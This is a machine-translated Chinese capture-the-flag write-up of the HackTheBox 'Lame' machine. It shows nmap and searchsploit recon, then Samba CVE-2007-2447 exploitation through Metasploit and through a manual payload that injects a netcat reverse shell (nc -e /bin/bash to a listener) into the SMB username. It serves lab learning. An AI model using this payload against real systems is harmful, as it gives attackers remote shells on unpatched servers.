# 黑客盒子评论——蹩脚

> 原文：<https://infosecwriteups.com/htb-lame-writeup-e47100aea88b?source=collection_archive---------0----------------------->

*这是从*[*HackTheBox*](https://www.hackthebox.eu/)*中写出的机器* [*瘸腿*](https://www.hackthebox.eu/home/machines/profile/1) *。*

![](img/503e023a2a162b33d7a20cbceb15c9c7.png)

机器地图

# 摘要

Lame 是基于 Linux 平台的初学者友好型机器。这是 HTB 的第一台机器。利用 samba 用户名映射脚本漏洞获取用户和根用户。

> 机器作者:[ch4p](https://www.hackthebox.eu/home/users/profile/1)机器类型:Linux
> 机器级别:2.7/10

# 专有技术

*   Nmap
*   Searchsploit

# 吸收技能

*   [CVE-2007–2447](http://cvedetails.com/cve/cve-2007-2447)
*   Samba“用户名映射脚本”命令执行

# 扫描网络

```
$nmap -sC -sV 10.10.10.3
```

![](img/c04d83f542c299429b055019aa6b2627.png)

man nmap

![](img/dd3a59acd94310e231f13815e02d6363.png)

nmap 结果

# 易受攻击的 Ftp

```
searchsploit vsftpd 2.3.4
```

![](img/5e9029b5749e0a155e518e133b2d2cb8.png)

searchsploit ftp

我试图执行漏洞，但每次都失败了:(

# 脆弱的桑巴

当使用非默认的“用户名映射脚本”配置选项时，此模块利用了 Samba 版本 3.0.20 到 3.0.25rc3 中的命令执行漏洞。通过指定包含 shell mmeta 字符的用户名，攻击者可以执行任意命令。利用此漏洞不需要身份验证，因为此选项用于映射用户名 pbeforeauthentication！。

```
$searchsploit Samba 3.0.20
```

![](img/3bdb8eebadd1b0bbbca317d60f22f4f7.png)

searchsploit 桑巴

# 利用服务器

```
msf5 >use exploit/multi/samba/usermap_scriptset RHOSTS 10.10.10.3
exploit
```

![](img/3f8d77e5e2688d101967699b1b8c2170.png)

壳

# 没有 Metasploit 的手动利用

```
logon “./=`nohup nc -e /bin/bash 10.10.14.7 4444`"
```

*   登录:-用于登录 smb
*   nohup:-运行不受挂起影响的命令，输出到非 tty

![](img/9f4eac8fa7c92f5a4de2ea126cdddf28.png)

# 自己的用户

用户 makis 拥有 user.txt

![](img/8ad24645e05f849537e3a73d5ad94cd0.png)

自己的用户

# 自己的根

![](img/2ece27651ed26e0bb745d77c163dc151.png)

自己的根

![](img/a9ff09c6eb58ce9279bc28f4c49a288e.png)

奖品

*感谢阅读！如果你喜欢这个故事，请点击**👏 ***按钮，分享*** *它来帮助别人！欢迎留言评论*💬*下图。有反馈？下面我们连线上* [*推特*](https://twitter.com/yashanand155) *。**

## *❤️由[增加到](https://twitter.com/yashanand155)*

*[](https://twitter.com/yashanand155) [## inc0gnito

### inc0gnito 的最新推文(@yashanand155)。CTF 玩家| | hack the box | | CTFs with @ ABS 0 lut 3 pwn 4g 3🚩||调制…

twitter.com](https://twitter.com/yashanand155)*